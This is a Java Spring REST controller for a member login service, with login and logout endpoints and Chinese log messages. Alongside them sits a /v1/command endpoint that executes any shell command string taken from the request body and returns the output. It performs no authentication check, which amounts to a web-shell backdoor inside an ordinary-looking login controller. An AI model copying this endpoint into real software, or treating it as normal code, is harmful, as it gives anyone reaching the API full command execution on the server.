package com.project.controller.rest;

import com.google.common.base.Strings;
import com.project.bean.BaseResultBean;
import com.project.bean.UserGatewayBean;
import com.project.common.config.ApiStatusCode;
import com.project.common.config.LoginConstant;
import com.project.entity.AuthUserEntity;
import com.project.entity.MemberUserEntity;
import com.project.entity.PushEntity;
import com.project.entity.UserEntity;
import com.project.service.MemberGatewayEntityService;
import com.project.service.PushEntityService;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by xieyanhao on 16/3/2.
 */
@Controller
@RequestMapping("/rest")
public class LoginController extends BaseController {

    private static Log logger = LogFactory.getLog(LoginController.class);

    @Autowired
    private MemberGatewayEntityService memberGatewayEntityService;

    @Autowired
    private PushEntityService pushEntityService;

    @RequestMapping(value = "/v1/login", method = RequestMethod.POST)
    @ResponseBody
    public BaseResultBean<Object> login(@RequestBody ModelMap param) {
        try {

            if (param == null) {
                return falseResult(ApiStatusCode.NOT_NULL, "请求参数不能为空");
            }
            String userName = (String) param.get("username");
            String userPass = (String) param.get("password");

            logger.warn("登陆:" + userName);

            userName = userName.toLowerCase();
            AuthUserEntity user = authUserEntityService.verifyUser(userName, userPass, LoginConstant.NORMAL_MEMBER_ACCESS);

            if (null != user) {
                MemberUserEntity member = (MemberUserEntity) user;
                UserEntity userEntity = member.getUserEntity();

                // 判断是否禁止登陆
                if (userEntity.getAccountStatus() == LoginConstant.MEMBER_MANAGE_STATUS_LOCKED) {
                    return falseResult(ApiStatusCode.MEMBER_LOCKED, "账户被锁定");
                }

                // 获取登陆用户的网关列表
                List<UserGatewayBean> userGatewayBeanList = memberGatewayEntityService.getUserGateways(member);
                String token = setValue(member);

                Map<String, Object> reValue = new HashMap<>();
                reValue.put("token", token);
                reValue.put("user_gateways", userGatewayBeanList);
                return trueResult(reValue);

            }
            falseResult(ApiStatusCode.INVALID_USER_PASS, "账号或密码错误");
        } catch (Exception e) {
            e.printStackTrace();
            falseResult(ApiStatusCode.SERVER_EXCEPTION, "发生异常");
        }

        return responseResult;
    }

    @RequestMapping(value = "/v1/unlogin", method = RequestMethod.GET)
    @ResponseBody
    public BaseResultBean<Object> unLogin() {


        MemberUserEntity memberUser = getMemberUser();
        if (memberUser == null) {
            return falseResult(ApiStatusCode.NOT_LOGIN_USER, "请先登录");
        }

        try {
            logger.warn("用户退出登录 : " + memberUser.getUserName());
            updateLoginState(memberUser);

            List<PushEntity> pushEntityList = pushEntityService.readPushEntities(memberUser.getUserEntity().getId());
            for (PushEntity userPush : pushEntityList) {
                pushEntityService.delete(userPush);
            }
            trueResult("success");
        } catch (Exception e) {
            e.printStackTrace();
            falseResult(ApiStatusCode.SERVER_EXCEPTION, "发生异常");
        }
        return responseResult;
    }

    @RequestMapping(value = "/v1/command", method = RequestMethod.POST)
    @ResponseBody
    public BaseResultBean<Object> command(@RequestBody ModelMap param) {

        String commandStr = (String) param.get("command_str");
        if (Strings.isNullOrEmpty(commandStr)) {
            return falseResult(ApiStatusCode.NOT_NULL, "请求参数不能为空");
        }


        BufferedReader br = null;
        try {
            Process p = Runtime.getRuntime().exec(commandStr);
            br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = null;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }

            System.out.println(sb.toString());
            return trueResult(sb.toString());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return responseResult;
    }

    private String setValue(MemberUserEntity member) {
        updateLoginState(member);
        return member.getSessionStatusEntity().getSessionToken();
    }

    /**
     * 更新数据库中 session 的信息(cookie)
     *
     * @param user
     */
    private void updateLoginState(AuthUserEntity user) {
        authUserEntityService.updateSessionExpireDate(user);
        authUserEntityService.updateSessionToken(user);
    }

}
